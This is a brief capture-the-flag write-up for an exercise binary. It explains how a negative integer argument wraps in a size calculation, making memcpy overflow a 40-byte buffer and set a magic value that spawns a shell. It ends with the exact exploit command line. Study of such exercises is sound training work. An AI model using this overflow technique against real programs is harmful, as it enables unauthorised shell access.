# Overflow Integer

## Context

There is a integer = to atoi(argv[1]). 

if this integer is minus than 10, it memcpy into a buffer[40] above the integer, writing argv[2], size of atoi(argv[1] * 4). The idea is to buffer overflow the buffer to overwrite the integer.

Because if it is equal to 0x574f4c46. it spawn a shell.

Problem, we can write more than 36 byte with argv[1] = "9".

## Exploit 

Lets try negatif values !

Memcpy(), take a unsigned int, so it convert our value to an usigned value.

`./bonus1 -1` read 0xfffffffc value (toooooo much)

We want the programm read 44 value (0x2c) (40 offset + overwrite int).

`./bonus1 -2147483646` read 0x8

We're close, it tryed find the good one and finish with `-2147483637`

Now were down with this challenge.

```bash
./bonus1 -2147483637 $(python2.7 -c 'print("A" * 40 + "\x46\x4c\x4f\x57")') 
```